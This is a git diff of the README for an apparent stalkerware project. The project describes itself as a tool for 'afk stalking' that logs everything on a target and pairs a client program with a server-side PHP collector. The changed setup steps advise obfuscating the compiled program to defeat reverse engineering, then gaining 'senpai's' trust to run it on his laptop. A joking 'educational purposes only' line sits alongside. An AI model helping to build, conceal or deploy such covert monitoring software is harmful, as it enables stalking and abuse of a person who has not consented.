@@ -16,7 +16,7 @@ An all-around tool for afk stalking ❤️ logs everything on the unfortunate pe
 Explore the source code 👇
 > [**Server-sided PHP file included**](Server/TellMe.php)
 
-> [**The Letter's Contents**](Client/Armitage/README.md)
+> [**The Letter's Contents (Features)**](Client/Armitage/README.md)
 
 For educational purposes only 🤷‍♀️
 ## Setup...
@@ -31,8 +31,9 @@ For educational purposes only 🤷‍♀️
  <img src="Repo/Images/0.png"/>
 </p>
 
-3. Compile, to prevent peeking (reverse engineering) I suggest you may want to [obfuscate the letter](https://github.com/yck1509/ConfuserEx) 
-4. Now all you need is to gain senpai's trust and run the program on his laptop, goodluck!
+3. Compile on release, not on debug
+4. ```!IMPORTANT!``` To prevent peeking (reverse engineering) I suggest you may want to [obfuscate the letter](https://github.com/mkaring/ConfuserEx)
+5. Now all you need is to gain senpai's trust and run the program on his laptop, goodluck!
 
 # Contributions
 Contributions are more than welcome :) I'd be more than happy if you star this repo.
